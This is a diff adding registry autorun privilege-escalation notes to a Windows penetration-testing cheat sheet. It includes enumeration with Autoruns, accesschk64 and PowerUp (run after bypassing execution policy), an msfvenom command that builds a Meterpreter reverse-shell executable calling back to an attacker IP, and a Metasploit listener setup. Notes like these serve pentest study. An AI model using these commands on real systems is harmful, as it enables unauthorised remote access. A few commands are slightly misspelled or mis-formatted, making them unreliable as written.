@@ -197,6 +197,42 @@ cmdkey /list
 C:\Windows\System32\runas.exe /user:[domain\user] /savecred "C:\Windows\System32\cmd.exe /c [command to run]"
 ```
 ## Registry
+### Enumeration
+#### Executionw with SysInternals
+##### [Autoruns](https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns)
+> This actually opens a window, so is not command line only. Command line is autorunsc.exe
+* List all of the autorun executables in the registry
+```cmd
+autoruns64.exe
+```
+* Check permissions on the autorun executable with [accesschk64](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk)
+```cmd
+accesschk64 -wvu "[Path to executable(.exe)"
+```
+##### Exeucution with PowerUP
+```powershell
+powershell -ep bypass
+
+#Import PowerUp module
+. .\PowerUp.ps1
+
+# Execute All Checks (Similar to WinPEAS)
+Invoke-AllCheck
+```
+### Exploitation
+* Generate a revshell executable
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp lhost=[attackerIP] lport=[attacker port] -f exe -o [filename].exe
+```
+* MSFConsole
+```bash
+use multi/handler
+set lhost=[attacker IP]
+set payload windows/meterpreter/reverse_tcp
+exploit
+```
+* Log out and log in or login as administrative user
+
 
 ## Executables
 
